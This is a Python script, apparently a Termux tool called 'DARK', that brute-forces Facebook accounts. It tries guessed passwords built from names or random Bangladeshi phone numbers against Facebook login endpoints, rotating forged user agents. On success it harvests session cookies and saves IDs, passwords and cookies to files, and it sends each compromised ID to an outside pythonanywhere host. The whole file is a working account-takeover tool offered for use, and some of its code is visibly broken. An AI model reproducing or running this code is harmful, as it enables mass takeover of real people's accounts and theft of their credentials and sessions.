import uuid
import string
from os import path
from urllib.request import urlopen
import os
import time
import re
import random
import sys
import subprocess
import platform
import base64
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import getpass

def clear():
    os.system('clear')
#------------------[ DARK-COLOR ]-------------------#
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
#------------------[ DARK-INTRO ]-------------------#
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update... ')
time.sleep(1)
os.system("git pull")
os.system('clear')
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mInstalling modules... ')
time.sleep(1)
os.system("pkg install espeak")
os.system("pip install requests")
os.system("pip install rich")
os.system("pip install bs4")
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN OUR FACEBOOK GROUP")
time.sleep(1)
os.system(f'xdg-open https://www.facebook.com/groups/2477016825771219')
print()
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY GITHUB ACCOUNT")
time.sleep(1)
os.system(f'xdg-open https://github.com/coderet-d-looper')
print()
attemps = 0
while attemps < 12345677901:
    username = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter username: ')
    print()
    password = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter password: ')

    if username == 'B' and password == 'K':
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mLOGIN SUCCESSFULLY.....')
        os.system('espeak -a 300 " Login, Successfull"')
        time.sleep(2)
        break
    else:
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;91mIncorrect Please Trying ')
        time.sleep(2)
        attemps += 1
        continue

os.system('clear')

try:
    import requests
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python Dark.py')

logo=("""
\033[1;32m ██████╗░░█████╗░██████╗░██╗░░██╗        ███████╗
\033[1;32m ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝        ╚════██║
\033[93;1m ██║░░██║███████║██████╔╝█████═╝░        ░░███╔═╝
\033[1;32m ██║░░██║██╔══██║██╔══██╗██╔═██╗░        ██╔══╝░░
\033[93;1m ██████╔╝██║░░██║██║░░██║██║░╚██╗        ███████╗
\033[93;1m ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝        ╚══════╝
\x1b[1;92m┏───────────────────────────────────────────────┓
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mD A R K Z
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m TYPE       \x1b[1;97m: \x1b[1;92mFREE🔥
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mcoderet-d-looper         
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m VERSION    \x1b[1;97m: \x1b[1;92m0.0.1
\x1b[1;92m┗───────────────────────────────────────────────┛""")
ugen=[]
ugen2=[]
for fucker in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['10','11','11','12','13'])
    model='SM-A515F Build/TP1A.220624.014'
    c='; wv) AppleWebKit/'
    p='537'
    q='36'
    r='(KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/'
    i='537'
    j='36'
    uagent=f'{a} {b}; {model}{c}{p}.{q}{r}{d}.{e}.{f}.{g} {h}{i}.{j}'
    ugen.append(uagent)
for fucker in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['11','12','13'])
    model='RMX3286 Build/SP1A.210812.016'
    c='; wv) AppleWebKit/'
    p='537'
    q='36'
    r='(KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/'
    i='537'
    j='36'
    uagent=f'{a} {b}; {model}{c}{p}.{q}{r}{d}.{e}.{f}.{g} {h}{i}.{j}'
    ugen.append(uagent)
for fucker in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['10','11','11','12','13'])
    mobile='Nokia C3 Build/QP1A.190711.020'
    c='; wv) AppleWebKit/'
    p='537'
    q='36'
    r='(KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/'
    i='537'
    j='36'
    uagent=f'{a} {b}; {mobile}{c}{p}.{q}{r}{d}.{e}.{f}.{g} {h}{i}.{j}'
    ugen2.append(uagent)
def linex():
        print(47*'\033[38;5;46m▬\033[1;37m')
def clear():
        os.system(f'clear')
        print(logo)

loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
#------------------[ DARK-MENU ]-------------------#
def menu():
    try:
        clear()
        if 1 == 1:
            clear()
            linex()
            print('\033[1;37m[01] FILE CLONING [ON]\n\033[1;37m[02] RANDOM CLONING [WORKING]\n\033[1;37m[03] VISIT MY ACCOUNT\n\033[1;37m[04] CLOSE TOOL')
            linex()
            xd = input('\033[1;37m[💥] CHOOSE : ')
            if xd in ['1', '01']:
                clear()
                os.system('espeak -a 300 " Enter, your, file , name"')
                print('\033[1;32m[PUT FILE EXAMPLE:  /sdcard/DARK.txt  Etc...]')
                file = input('\033[1;37m[📂] INPUT FILE NAME: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    os.system('espeak -a 300 " File, location, not, found"')
                    print('[❌] FILE LOCATION NOT FOUND [❌]')
                    time.sleep(1)
                    menu()
                clear()
                print('\033[1;32m[1] METHOD 1 [m.]\n[2] METHOD 2 [p.]\n[3] METHOD 3 [b-api]')
                os.system('espeak -a 300 " Choose, method, for, cloning"')
                linex()
                mthd = input('\033[1;32m[+] CHOOSE : ')
                linex()
                plist = []
                print('\033[1;37m           SELECT CRACK MENU')
                linex()
                print('[1] AUTO PASSWORD [BEST]\n[2] MANUAL PASSWORD')
                linex()
                ppp = input('\033[1;32m[+] CHOOSE : ')
                if ppp in ['1', '01']:
                    plist.append('first last')
                    plist.append('first')
                    plist.append('firstlast')
                    plist.append('first12')
                    plist.append('first123')
                    plist.append('first1234')
                    plist.append('first12345')
                    plist.append('first123456')
                    plist.append('first11')
                    plist.append('first111')
                    plist.append('first1122')
                    plist.append('first112233')
                    plist.append('first@')
                    plist.append('first@@')
                    plist.append('first@@@')
                    plist.append('first@@@@')
                    plist.append('i love you')
                    plist.append('last')
                    plist.append('last12')
                    plist.append('last123')
                    plist.append('last1234')
                    plist.append('last11')
                    plist.append('last111')
                    plist.append('last1122')
                    plist.append('last@')
                    plist.append('last@@')
                    plist.append('last@@@')
                    plist.append('last@@@@')
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(' HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
                    except:
                        ps_limit = 15
                    linex()
                    print('\033[1;32m EXAMPLE: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(
                            input(f'\033[1;32m[+] PUT PASSWORD {i+1}: '))
                linex()
                print('[🍬]SHOW CP ACCOUNT? (Y/n): ')
                linex()
                cx = input(' CHOOSE: ')
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('[+] TOTAL ID : \033[1;32m'+total_ids)
                    print("\033[1;35m[+] CRACKING SPEED - FAST✅ ")
                    print("\033[1;33m[+] CRACKING HAS BEEN STARTED")
                    linex()
                    print("""\033[1;91m<═══\033[1;41m\033[1;97m ✈ USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m═══>\033[1;92m""")
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(m1, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(m2, ids, names, passlist)
                print('\033[1;37m')
                linex()
                os.system('espeak -a 300 " Cracking, has, completed"')
                print('[+]CRACKING HAS COMPLETED')
                print('[+]Total OK/CP/2F: '+str(len(oks)) +
                      '/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                os.system('espeak -a 300 " press, enter, for, main, menu"')
                input('[👉]PRESS ENTER FOR MAIN MENU[👈]')
                os.system('python Dark.py')
            elif xd in ['3', '03']:
                os.system(' xdg-open https://www.facebook.com/coderet.d.looper')
                menu()
            elif xd in ['4', '04']:
                exit('BYE BYE Tata Gaya')
            elif xd in ['2', '02']:
                clear()
                print(
                    ' [1] Bangladesh cloning \n [0] Back menu')
                linex()
                x = input(' Choose: ')
                if x in ['1', '01']:
                    bd()
                if xd in ['0', '00']:
                    menu()
            else:
                exit(' Option not found in menu...')
        else:
            print(' Run :  python Dark.py')
            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()

def bd():
    user = []
    clear()
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    os.system('espeak -a 300 " Welcome, to, random, cloning, tool"')
    print(" BD SIM CODE=><>< 017,018,019,014,013,015")
    linex()
    os.system('espeak -a 300 " Enter, sim ,code"')
    code = input('[📞] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(1))
    koder = ''.join(random.choice(string.digits) for _ in range(1))
    kod = ''.join(random.choice(string.digits) for _ in range(1))
    kode = ''.join(random.choice(string.digits) for _ in range(1))
    kodem = ''.join(random.choice(string.digits) for _ in range(1))
    kodey = ''.join(random.choice(string.digits) for _ in range(1))
    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(2))
        user.append(nmp)
    with ThreadPool(max_workers=50) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;33m[♥]  TOTAL IDS :\033[1;92m ' + tl)
        print( "\033[1;33m[♥]  YOUR TARGET CRACK MENU:\033[1;92mRANDOM CLONING")
        print('\033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
        print(f"\033[1;33m[♥]  CHOOSEN SIM CODE:\033[1;92m {code}")
        print("""\033[1;91m\033[1;41m\033[1;97m USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m\033[1;92m""")
        print(50 * '_')
        for guru in user:
            uid = code + kodex + koder + kod + kode + kodem + kodey + guru
            pasx = [code + kodex + koder + kode, code + kodex + koder + kod + kode, code + kodex + koder + kod + kode + kodem, code + kodex + koder + kod + kode + kodem + kodey, code + kodex + koder + kod + kode + kodem + kodey + guru, guru + kodey + kodem + kode + kod, guru + kodey + kodem + kode + kod + koder, guru + kodey + kodem + kode + kod + koder + kodex, 'Bangladesh', 'i love you', '111222', 'hridoy', 'shahin', 'sadiya', 'fariya', 'fatema', 'nadiya', 'password', '102030', '203040', '304050', '405060', '506070', '607080', '708090', '222333', '333444', '444555', '112233']
            yaari.submit(rcrack,uid,pasx,tl)
def rcrack(uid,pasx,tl):
    global loop
    global cps
    global oks
    try:
        for ps in pasx:
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sSEARCHING\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https', 
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://x.facebook.com',
            'referer': 'https://x.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                cix = coki.split('c_user')[1]
                cid = cix[0:15]
                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
                if 'LOCK' in res:
                    return 'LOCK'
                else:
                 print('\r\r\033[1;32m[DARK-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[COOKIES💉] • \033[1;32m'+coki+  '  \n\033[1;33m [🚀] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                os.system('espeak -a 300 " Dark, ok, id"')
                open('/sdcard/RANDOM-OK.txt', 'a').write(uid+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[DARK-CP💔] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                os.system('espeak -a 300 " CP"')
                open('/sdcard/RANDOM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:pass

def m1(ids,names,passlist,total):
        global loop,oks,cps
        bi = random.choice([A,B,C,D,E,F,G,H])
        sys.stdout.write(f'\r \033[1;31m[%sDARK•M1\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,total,len(oks))),
        sys.stdout.flush()
        ses = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        ua2=random.choice(ugen2)
                        ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":ids,"flow":"login_no_pin","pass":pas,"next":"https://m.facebook.com/login/save-device/'"}
                        ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
                        open = ses.cookies.get_dict().keys()
                        if "c_user" in open:
                                coki=ses.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                print(f'\r\033[1;97m[\033[1;96mDARK-OK💚\033[1;97m]\033[1;92m '+ids+' • '+pas+'\n\033[0;93m[🍪]= COOKIES • \033[0;92m '+kuki+' ')
                                os.system('espeak -a 300 " Dark, OK, ID"')
                                open(f'/sdcard/openM1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in open:
                                        print(f'\r\r\x1b[38;5;208m[DARK•CP] '+ids+' • '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 " CP"')
                                        open(f'/sdcard/open.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [DARK•M2] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ses = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        ua2=random.choice(ugen2)
                        ses.headers.update({"Host":'p.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":ids,"flow":"login_no_pin","pass":pas,"next":"https://m.facebook.com/login/save-device/'"}
                        ses.headers.update({"Host":'p.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
                        open = ses.cookies.get_dict().keys()
                        if "c_user" in open:
                                coki=ses.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                print(f'\r\033[1;97m[\033[1;96mDARK-OK💚\033[1;97m]\033[1;92m '+ids+' • '+pas+'\n\033[0;93m[🍪]= COOKIES • \033[0;92m '+kuki+' ')
                                os.system('espeak -a 300 " Dark, OK, ID"')
                                open(f'/sdcard/open•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in open:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m[DARK•CP] '+ids+' • '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 " CP"')
                                        open(f'/sdcard/open•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
menu()
